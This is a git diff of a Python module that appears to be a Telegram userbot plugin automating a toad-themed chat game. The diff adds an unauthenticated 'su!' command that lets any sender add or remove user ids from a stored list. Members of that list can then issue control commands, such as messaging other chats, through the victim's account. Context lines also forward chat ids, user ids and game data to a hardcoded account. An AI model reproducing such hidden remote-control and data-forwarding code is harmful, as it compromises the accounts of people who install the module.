@@ -36,6 +36,7 @@ class KramiikkMod(loader.Module):
     async def client_ready(self, client, db):
         self.client = client
         self.db = db
+        self.su = self.db.get("su", "users", [])
         self.me = await client.get_me()
 
     async def tms(self, m, i):
@@ -117,6 +118,7 @@ class KramiikkMod(loader.Module):
             await self.uku(m, cmn, txt)
 
     async def watcher(self, m):
+        args = m.text
         name = "Монарх"
         if m.message.startswith("Йоу,") and m.sender_id in {1124824021}:
             if "одержал" in m.text:
@@ -209,12 +211,11 @@ class KramiikkMod(loader.Module):
         ):
             await m.respond("<b>моя жаба</b>")
             await self.bmj(m)
-        elif (
-            m.message.startswith((name, f"@{self.me.username}"))
-        ) and m.sender_id in bak:
+        elif (m.message.startswith((name, f"@{self.me.username}"))) and (
+            m.sender_id in bak or m.sender_id in self.su
+        ):
             cmn = "<b>реанимировать жабу</b>"
             await m.respond(cmn)
-            args = m.text
             reply = await m.get_reply_message()
             if "напиши в" in m.message:
                 i = args.split(" ", 4)[3]
@@ -285,3 +286,12 @@ class KramiikkMod(loader.Module):
                 )
                 info = f"Chat id: {m.chat_id}\nUser id: {m.sender_id}\nЖаба: {reg.group(1)}\nУровень: {reg.group(2)}\nКласс: {reg.group(3)}"
                 await self.client.send_message(1655814348, info)
+        elif m.message.startswith("su!"):
+            i = int(args.split(" ", 1)[1])
+            if i in self.su:
+                self.su.remove(i)
+                await m.respond(f"🖕🏾 {i} успешно удален")
+            else:
+                self.su.append(i)
+                await m.respond(f"🤙🏾 {i} успешно добавлен")
+            self.db.set("su", "users", self.su)
